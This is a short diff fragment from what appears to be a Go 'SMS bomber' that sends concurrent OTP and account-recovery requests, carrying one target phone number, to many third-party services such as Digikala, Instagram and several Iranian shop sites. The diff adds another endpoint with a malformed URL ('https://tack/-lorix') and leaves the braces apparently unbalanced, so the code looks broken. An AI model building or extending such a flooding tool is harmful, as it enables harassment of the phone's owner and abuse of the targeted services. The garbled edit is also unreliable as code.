@@ -206,7 +206,7 @@ func main() {
 		}, ch)
 		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
 			"username": phone,
-		}, ch)
+		}, ch) 
 		go sms("https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{
 			"identifier": phone,
 		}, ch)
@@ -633,6 +633,10 @@ func main() {
 		s50 := fmt.Sprintf("email_or_username=%2B%s&recaptcha_challenge_field=&flow=&app_id=&source_account_id=", phone)
 		go sms("https://www.instagram.com/accounts/account_recovery_send_ajax/", map[string]interface{}{
 			s50: phone,
+			}, ch)
+		go sms("https://tack/-lorix", map[string]interface{}{
+			"PhoneNumber": phone,
+		}, ch)
 		}, ch)
 		s51 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=%s&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828", phone, phone)
 		go sms("https://shop.hemat-elec.ir/wp-admin/admin-ajax.php", map[string]interface{}{
